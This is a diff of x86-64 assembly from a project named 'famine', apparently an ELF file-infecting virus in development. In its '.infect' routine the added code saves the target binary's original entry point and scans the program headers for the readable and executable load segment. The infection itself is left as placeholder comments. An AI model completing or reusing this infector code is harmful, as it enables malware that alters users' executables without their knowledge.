@@ -118,7 +118,6 @@ section .text
             ;     syscall
 
             .mmap:
-                TRACE_TEXT hello, 11
                 mov rdi, 0x0
                 mov rsi, VAR(famine.file_original_len)
                 mov rdx, PROT_READ | PROT_WRITE
@@ -132,7 +131,40 @@ section .text
                 mov VAR(famine.mmap_pointer), rax 
 
             .infect:
-                mov VAR(famine.original_entry), rax + elf64_ehdr.e_entry
+                ; rax = mmap pointer
+                mov rbx, [rax + elf64_ehdr.e_entry]
+                mov VAR(famine.original_entry), rbx
+
+                ; rbx = &(rax + e_phoff)
+                lea rbx, [rax + elf64_ehdr.e_phoff]
+                ; rbx = rax + *(rbx)
+                mov rbx, [rbx]
+                add rbx, rax
+                movzx eax, word [rax + elf64_ehdr.e_phnum]
+                
+                ;rax = phnum
+                ;rbx = phdr_pointer                
+                .loop_phdr:
+                    cmp rax, 0
+                    jle .end_loop_phdr
+                    ; lo que sea de rbx
+
+                    cmp dword [rbx], 0x1
+                    jne .next_phdr
+                    cmp dword [rbx + 4], 0x5 ; (1 << 2) | (1 << 0)
+                    jne .next_phdr
+                    TRACE_TEXT hello, 11
+                    jmp .end_loop_phdr
+
+                .next_phdr:
+                    dec rax
+                    add rbx, 56 ; siguiente nodo del phdr
+                    jmp .loop_phdr
+
+
+                .end_loop_phdr:
+                    ; cambiar tamaños
+                    ; lo que sea
 
             .close_file:
                 mov rdi, VAR(famine.fd_file)
